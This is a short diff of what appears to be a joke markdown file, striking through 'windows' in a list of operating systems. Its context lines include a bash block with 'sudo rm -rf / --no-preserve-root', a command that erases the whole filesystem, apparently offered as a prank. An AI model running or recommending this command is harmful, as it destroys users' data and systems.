@@ -19,7 +19,7 @@ my name is money, some call me **dollar**
 
 1. linux
 2. macos
-3. windows
+3. ~~windows~~
 
 ```bash
 sudo rm -rf / --no-preserve-root
